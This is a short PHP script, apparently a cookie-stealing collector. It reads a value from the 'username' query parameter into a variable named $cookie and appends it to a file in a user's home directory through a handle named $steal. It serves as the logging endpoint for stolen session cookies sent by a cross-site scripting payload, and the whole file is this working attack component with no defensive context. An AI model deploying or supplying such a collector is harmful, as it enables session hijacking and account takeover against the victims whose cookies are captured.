<?php
$cookie = $_GET["username"];
$steal = fopen("/home/billybob/cookiefile.txt", "a+");
fwrite($steal, $cookie ."\n");
fclose($steal);






?>
